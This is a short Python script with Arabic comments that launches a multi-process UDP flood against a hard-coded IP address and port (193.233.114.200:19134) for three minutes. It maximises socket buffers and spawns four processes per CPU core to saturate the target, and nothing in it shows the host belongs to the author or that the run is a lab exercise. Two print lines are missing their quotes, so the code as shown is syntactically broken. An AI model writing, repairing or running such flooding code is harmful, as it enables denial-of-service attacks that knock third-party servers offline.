import socket
import time
from multiprocessing import Process, cpu_count

# ==========================================
# إعدادات الهدف والأداء الأقصى (UDP)
# ==========================================
TARGET_IP = "193.233.114.200"
TARGET_PORT = 19134
DURATION = 180          # مدة التشغيل بالثواني قبل التوقف التام
SOCKETS_PER_WORKER = 10 # عدد المقابس لكل عملية لتسريع الضخ

def udp_stress_worker(ip, port, duration):
    end_time = time.time() + duration
    
    # إنشاء مصفوفة مقابس (Sockets) خاصة بهذه العملية لتجنب التأخير
    active_sockets = []
    for _ in range(SOCKETS_PER_WORKER):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # رفع حجم المخزن المؤقت للشبكة للحد الأقصى
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
        except Exception:
            pass
        active_sockets.append(sock)
    
    # حمولة بيانات عشوائية تحاكي ضغط الحزم الموجهة للبروتوكول
    payload = b"\x01\x00\x00\x00\x00\x00\x00\x00" * 16
    
    # حلقة إرسال فائقة السرعة بدون توقف حتى انتهاء الوقت المحدد
    try:
        while time.time() < end_time:
            for s in active_sockets:
                for _ in range(50): # دفعات متتالية في كل دورة
                    s.sendto(payload, (ip, port))
    except Exception:
        pass
    finally:
        for s in active_sockets:
            try:
                s.close()
            except Exception:
                pass

def main():
    # استغلال كامل طاقة المعالج عبر مضاعفة العمليات
    workers = cpu_count() * 4
    print([*] تم إطلاق محرك ضغط UDP بـ {workers} عملية متوازية.)
    print([*] الهدف المستهدف: {TARGET_IP}:{TARGET_PORT} | المدة: {DURATION} ثانية.)
    
    processes = []
    
    # تشغيل العمليات بالتوازي
    for _ in range(workers):
        p = Process(target=udp_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
        processes.append(p)
        p.start()
        
    # الانتظار حتى انتهاء الوقت المحدد وتوقف العمليات تلقائياً
    for p in processes:
        p.join()
        
    print("[*] انتهى الوقت المحدد! توقف إرسال الحزم بالكامل.")

if __name__ == '__main__':
    main()
